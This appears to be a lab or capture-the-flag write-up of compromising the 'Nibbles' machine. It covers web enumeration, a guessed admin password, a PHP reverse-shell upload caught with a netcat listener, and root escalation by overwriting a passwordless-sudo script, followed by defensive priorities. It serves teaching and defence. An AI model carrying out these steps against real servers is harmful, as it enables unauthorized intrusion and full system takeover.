# ATTACK NARRATIVE

**Engagement:** Nibbles  
**Target:** 10.10.10.75  
**Operating System:** Linux (Ubuntu)  

**Timeline note:** Timestamps below are illustrative. Actual execution times were not supplied.

## [09:00] Reconnaissance

We scanned the target to identify accessible services.

```bash
nmap -sC -sV 10.10.10.75
```

The scan identified:

- TCP 22: SSH — OpenSSH 7.2p2
- TCP 80: HTTP — Apache 2.4.18

The web service became the focus of further enumeration.

## [09:15] Web Enumeration

We searched for directories using Gobuster:

```bash
gobuster dir -u http://10.10.10.75 \
  -w /usr/share/wordlists/dirb/common.txt
```

The results revealed:

```text
/nibbleblog (Status: 301)
```

This exposed a Nibbleblog installation for further investigation.

## [09:20] Administrative Access

We accessed the administration page:

```text
http://10.10.10.75/nibbleblog/admin.php
```

A guessed credential pair successfully authenticated:

```text
Username: admin
Password: nibbles
```

This provided access to the application's administrative functions, including plugin configuration.

## [09:25] Executable File Upload

Within the administration interface, we navigated to:

```text
Plugins → My Image
```

We uploaded a PHP reverse shell configured to connect to the testing machine on TCP 4444.

The application accepted the file and stored it at:

```text
/nibbleblog/content/private/plugins/my_image/image.php
```

The ability to upload and execute PHP converted administrative application access into a path to operating system access.

## [09:30] Initial System Access

On the testing machine, we started a listener:

```bash
nc -lvnp 4444
```

From a separate terminal, we requested the uploaded file:

```bash
curl http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
```

The request executed the PHP file and established a reverse shell. Inside the shell, we checked the current account:

```bash
whoami
```

Observed output:

```text
nibbler
```

This confirmed initial system access as the unprivileged user `nibbler`.

## [09:40] Privilege Enumeration

From the compromised account, we examined permitted administrative commands:

```bash
sudo -l
```

The output included:

```text
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

This rule allowed `nibbler` to execute the specified script as root without supplying a password. The script was also writable by the compromised account.

## [09:45] Privilege Escalation

We replaced the writable script's contents with commands that launch an interactive Bash shell:

```bash
echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
echo 'bash -i' >> /home/nibbler/personal/stuff/monitor.sh
```

We then executed it through the permitted sudo rule:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

Because sudo executed the modified script as root, the resulting shell inherited root privileges.

## [10:00] Root Access Confirmed

We verified the effective account:

```bash
whoami
```

Observed output:

```text
root
```

This confirmed complete administrative control of the target.

## Attack Path Summary

The attack combined three weaknesses:

1. Guessable administrator credentials provided application access.
2. An executable PHP upload enabled command execution as `nibbler`.
3. A writable script permitted through passwordless sudo enabled escalation to root.

Root access demonstrated the ability to control the server. Data theft, lateral movement, and service disruption were not demonstrated in the supplied evidence.

## Defensive Priorities

- Replace weak credentials and restrict administrative access.
- Validate uploads and prevent uploaded files from executing as server-side code.
- Remove unnecessary sudo permissions and ensure privileged scripts and their parent directories cannot be modified by unprivileged users.
- Review authentication, upload, web access, and sudo logs for the corresponding activity.
